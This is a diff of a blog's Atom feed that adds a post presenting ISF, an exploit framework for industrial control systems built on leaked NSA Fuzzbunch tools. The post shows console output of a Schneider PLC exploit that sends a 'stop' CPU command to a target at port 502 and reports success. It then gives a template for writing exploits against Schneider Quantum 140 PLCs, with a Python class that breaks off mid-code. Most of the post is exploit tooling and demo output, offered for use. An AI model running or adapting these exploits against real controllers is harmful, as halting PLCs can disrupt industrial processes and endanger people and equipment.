@@ -1,5 +1,276 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>工匠实验室 | 专注于工控安全</title><link href="http://icsmaster.com/" rel="alternate"></link><link href="http://icsmaster.com/feeds/w3h.atom.xml" rel="self"></link><id>http://icsmaster.com/</id><updated>2017-05-13T14:36:00+08:00</updated><entry><title>Wannacry(永恒之蓝)勒索蠕虫跟踪分析</title><link href="http://icsmaster.com/security/wannacry.html" rel="alternate"></link><updated>2017-05-13T14:36:00+08:00</updated><author><name>w3h</name></author><id>tag:icsmaster.com,2017-05-13:security/wannacry.html</id><summary type="html">&lt;h2&gt;一、事件跟踪&lt;/h2&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>工匠安全实验室 | 专注于工控安全</title><link href="http://icsmaster.com/" rel="alternate"></link><link href="http://icsmaster.com/feeds/w3h.atom.xml" rel="self"></link><id>http://icsmaster.com/</id><updated>2017-07-04T14:36:00+08:00</updated><entry><title>工控漏洞利用框架 - ISF(Industrial Security Framework)</title><link href="http://icsmaster.com/tool/isf.html" rel="alternate"></link><updated>2017-07-04T14:36:00+08:00</updated><author><name>w3h</name></author><id>tag:icsmaster.com,2017-07-04:tool/isf.html</id><summary type="html">&lt;h2&gt;一、    框架介绍&lt;/h2&gt;
+&lt;p&gt;本框架主要使用Python语言开发，通过集成ShadowBroker释放的NSA工具Fuzzbunch攻击框架，开发一款适合工控漏洞利用的框架。由于Fuzzbunch攻击框架仅适用于Python2.6，很多核心的功能都封装成了DLL，通过函数进行调用，不便于后期的移植和使用。但是，Fuzzbunch的命令行使用的确很方便，而且够傻瓜，所以就有集成一个适合工控漏洞利用的框架想法。新框架对主要的接口使用Python重新实现，所以支持Python2.X版本。&lt;/p&gt;
+&lt;p&gt;肯定会有人问，有牛逼的MSF，搞这个玩竟儿有什么用？主要基于如下几点考虑&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MSF命令行使用不够傻瓜，纯属个人观点，仅供参考。&lt;/li&gt;
+&lt;li&gt;工控的很多私用协议都使用Python开发，有很多优秀的Python框架（如scapy、kitty），集成在MSF很麻烦，有一个Python的框架会方便很多。&lt;/li&gt;
+&lt;li&gt;最主要的一个原因是，从事工控安全以来，本人一直在使用Python，很多脚本都是基于Python开发的，想将手上所有的资源进行整合，提供一个统一的平台，方便。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;二、    框架使用&lt;/h2&gt;
+&lt;p&gt;进入目录，执行如下命令：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;python main.py
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;界面显示如下：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;D:\isf\isf&amp;gt;python main.py
+
+                               ???
+                         ???????????????
+                      ?????           ?????
+                   ????                   ????
+                 ????                       ????
+                ???                           ???
+               ???             ??              ???
+              ???           ????????            ???
+             ???           ???????????           ???
+             ???          ?????????????          ???
+             ??          ???????????????          ??
+             ??         ?????????????????         ??
+             ??        ??????       ?????         ??
+             ??            ???????????            ??
+             ??            ???????????            ??
+             ??             ?????????             ??
+             ???             ???????             ???
+             ???              ?????              ???
+              ???          ???????????          ???
+               ???      ?????????????????      ???
+                ???   ????????????????????    ???
+                  ?????????????????????????????
+                   ???????????????????????????
+                      ?????????????????????
+                         ---ICSMASTER---
+
++ - - - - - + [ Version 1.1.1                           ] + - - - - - +
++ - - - - - + [ MADE BY ICSMASTER. HTTP://ICSMASTER.COM ] + - - - - - +
+
+[*] Loading Plugins
+[*] Initializing isf v1.1.1
+[*] Adding Global Variables
+[+] Set ResourcesDir =&amp;gt;. c:\isf\Resources
+[+] Set Color =&amp;gt;. True
+[+] Set ShowHiddenParameters =&amp;gt;. False
+[+] Set NetworkTimeout =&amp;gt;. 60
+[+] Set LogDir =&amp;gt;. D:\isf\isf\logs
+[*] Autorun ON
+
+Exploit Autorun List
+====================
+
+  0) apply
+  1) touch all
+  2) prompt confirm
+  3) execute
+
+
+Payload Autorun List
+====================
+
+  0) apply
+  1) prompt confirm
+  2) execute
+
+
+[+] Set ISFStorage =&amp;gt;. D:\isf\isf\storage
+isf &amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;show命令使用，显示当前所有的插件，如下所示&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;isf &amp;gt; show
+
+Plugin Categories
+=================
+
+  Category     Active Plugin
+  --------     -------------
+  Exploit      None
+  Payload      None
+
+isf &amp;gt; show Exploit
+
+Plugin Category: Exploit
+========================
+
+  Name                            Version
+  ----                            -------
+  Schneider_CPU_Command           1.1.0
+  Siemens_300_400_CPU_Control     1.1.0
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;use命令使用，调用相关插件，并根据命令行提示配置参数，如下所示&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;isf&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Entering&lt;/span&gt; &lt;span class="n"&gt;Plugin&lt;/span&gt; &lt;span class="n"&gt;Context&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt;
+&lt;span class="o"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Applying&lt;/span&gt; &lt;span class="k"&gt;Global&lt;/span&gt; &lt;span class="n"&gt;Variables&lt;/span&gt;
+
+&lt;span class="o"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Applying&lt;/span&gt; &lt;span class="n"&gt;Session&lt;/span&gt; &lt;span class="n"&gt;Parameters&lt;/span&gt;
+&lt;span class="o"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Running&lt;/span&gt; &lt;span class="n"&gt;Exploit&lt;/span&gt; &lt;span class="n"&gt;Touches&lt;/span&gt;
+
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Enter&lt;/span&gt; &lt;span class="n"&gt;Prompt&lt;/span&gt; &lt;span class="n"&gt;Mode&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt;
+
+&lt;span class="n"&gt;Module&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt;
+&lt;span class="o"&gt;=============================&lt;/span&gt;
+
+  &lt;span class="n"&gt;Name&lt;/span&gt;            &lt;span class="n"&gt;Value&lt;/span&gt;
+  &lt;span class="o"&gt;----&lt;/span&gt;            &lt;span class="o"&gt;-----&lt;/span&gt;
+  &lt;span class="n"&gt;TargetIp&lt;/span&gt;
+  &lt;span class="n"&gt;TargetPort&lt;/span&gt;      &lt;span class="mi"&gt;502&lt;/span&gt;
+  &lt;span class="n"&gt;Command&lt;/span&gt;         &lt;span class="k"&gt;stop&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;plugin&lt;/span&gt; &lt;span class="n"&gt;variables&lt;/span&gt; &lt;span class="n"&gt;are&lt;/span&gt; &lt;span class="n"&gt;valid&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Prompt&lt;/span&gt; &lt;span class="k"&gt;For&lt;/span&gt; &lt;span class="n"&gt;Variable&lt;/span&gt; &lt;span class="n"&gt;Settings&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Yes&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
+
+&lt;span class="o"&gt;[*]&lt;/span&gt;  &lt;span class="n"&gt;TargetIp&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="n"&gt;Target&lt;/span&gt; &lt;span class="n"&gt;IP&lt;/span&gt; &lt;span class="n"&gt;Address&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;TargetIp&lt;/span&gt; &lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;192.168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;1.30&lt;/span&gt;
+&lt;span class="o"&gt;[+]&lt;/span&gt; &lt;span class="k"&gt;Set&lt;/span&gt; &lt;span class="n"&gt;TargetIp&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="mf"&gt;192.168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;1.30&lt;/span&gt;
+
+&lt;span class="o"&gt;[*]&lt;/span&gt;  &lt;span class="n"&gt;TargetPort&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="n"&gt;Target&lt;/span&gt; &lt;span class="n"&gt;Port&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;TargetPort&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;502&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="o"&gt;[+]&lt;/span&gt; &lt;span class="k"&gt;Set&lt;/span&gt; &lt;span class="n"&gt;TargetPort&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;502&lt;/span&gt;
+
+&lt;span class="o"&gt;[*]&lt;/span&gt;  &lt;span class="n"&gt;Command&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;control&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="k"&gt;of&lt;/span&gt; &lt;span class="n"&gt;cpu&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;stop&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Command&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;stop&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="o"&gt;[+]&lt;/span&gt; &lt;span class="k"&gt;Set&lt;/span&gt; &lt;span class="n"&gt;Command&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;stop&lt;/span&gt;
+
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Preparing&lt;/span&gt; &lt;span class="k"&gt;to&lt;/span&gt; &lt;span class="n"&gt;Execute&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt;
+
+&lt;span class="n"&gt;Module&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt;
+&lt;span class="o"&gt;=============================&lt;/span&gt;
+
+  &lt;span class="n"&gt;Name&lt;/span&gt;            &lt;span class="n"&gt;Value&lt;/span&gt;
+  &lt;span class="o"&gt;----&lt;/span&gt;            &lt;span class="o"&gt;-----&lt;/span&gt;
+  &lt;span class="n"&gt;TargetIp&lt;/span&gt;        &lt;span class="mf"&gt;192.168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;1.30&lt;/span&gt;
+  &lt;span class="n"&gt;TargetPort&lt;/span&gt;      &lt;span class="mi"&gt;502&lt;/span&gt;
+  &lt;span class="n"&gt;Command&lt;/span&gt;         &lt;span class="k"&gt;stop&lt;/span&gt;
+
+&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Execute&lt;/span&gt; &lt;span class="n"&gt;Plugin&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Yes&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="o"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Executing&lt;/span&gt; &lt;span class="n"&gt;Plugin&lt;/span&gt;
+&lt;span class="n"&gt;logging&lt;/span&gt; &lt;span class="k"&gt;to&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;
+&lt;span class="o"&gt;[+]&lt;/span&gt; &lt;span class="n"&gt;Schneider_CPU_Command&lt;/span&gt; &lt;span class="n"&gt;Succeeded&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;三、    EXP编写&lt;/h2&gt;
+&lt;p&gt;编写一个EXP需要包含两个文件，一个参数描述性的文件 &lt;em&gt;.xml 和 一个漏洞脚本文件 &lt;/em&gt;.py，两个文件的名字需要相同，xml定义输入输出的参数的基本信息，如下所示，EXP需要三个参数，分别是TargetIp、TargetPort、Command。注意：XML文件中 name 字段不能重复。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;t:config&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;c72514379eaad943b62f4080a5ae1dc61619f0f3&amp;quot;&lt;/span&gt;
+          &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Schneider_CPU_Command&amp;quot;&lt;/span&gt;
+          &lt;span class="na"&gt;version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1.1.0&amp;quot;&lt;/span&gt;
+          &lt;span class="na"&gt;configversion=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1.1.0.0&amp;quot;&lt;/span&gt;
+          &lt;span class="na"&gt;xmlns:xsi=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://www.w3.org/2001/XMLSchema-instance&amp;#39;&lt;/span&gt;
+          &lt;span class="na"&gt;xmlns:t=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;tc0&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+
+  &lt;span class="nt"&gt;&amp;lt;t:inputparameters&amp;gt;&lt;/span&gt;    
+    &lt;span class="nt"&gt;&amp;lt;t:parameter&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;TargetIp&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;description=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Target IP Address&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IPv4&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;t:parameter&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;TargetPort&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;description=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Target Port&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;TcpPort&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;default=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;502&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;t:parameter&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Command&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;description=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;The control command of cpu [stop/start]&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;String&amp;quot;&lt;/span&gt;
+                 &lt;span class="na"&gt;default=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stop&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;/t:inputparameters&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/t:config&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;漏洞利用脚本编写方法如下，如果不清楚可以直接拷贝如下模板进行修改&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;1、继承基础类 BaseExploit 
+2、填写POC基础信息 pocinfo
+3、注册命令行，向register_options变量增加make_option对象即可，注意参数名称需要与xml文件保持一致
+4、实现exploit函数&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class="c"&gt;# coding=utf-8&lt;/span&gt;
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;core.exploit&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+
+
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyPoc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BaseExploit&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;pocinfo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;ID&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;ICF-2017-000001&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;Name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;施耐德昆腾140系列PLC CPU控制&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;Author&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;w3h&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;Create_Date&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;2017-04-09&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;Description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&amp;#39;施耐德昆腾140系列PLC认证用户时Session使用是单比特，导致攻击者可以向PLC发送CPU控制指令。&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+
+        &lt;span class="s"&gt;&amp;#39;Vendor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;VENDOR&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SI&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;Device&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Schneider Quantum 140&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;App&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;Protocol&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;modbus&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;References&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;CVE&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;CNVD&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;OSVDB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;CNNVD&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;
+
+        &lt;span class="s"&gt;&amp;#39;Risk&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;RISK&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;H&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="c"&gt;# H/M/L&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;#39;VulType&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;VULTYPE&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;REP&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="n"&gt;register_options&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
+        &lt;span class="n"&gt;make_option&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;--TargetIp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;store&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;TargetIp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                    &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;string&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;The target of this poc.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+        &lt;span class="n"&gt;make_option&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;--TargetPort&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;store&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;TargetPort&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                    &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;int&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;502&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;The port of this poc [default:502].&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+        &lt;span class="n"&gt;make_option&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;--Command&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;The constrol commond of cpu&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Command&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stop&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+    &lt;span class="p"&gt;]&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;exploit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getParam&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Command&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
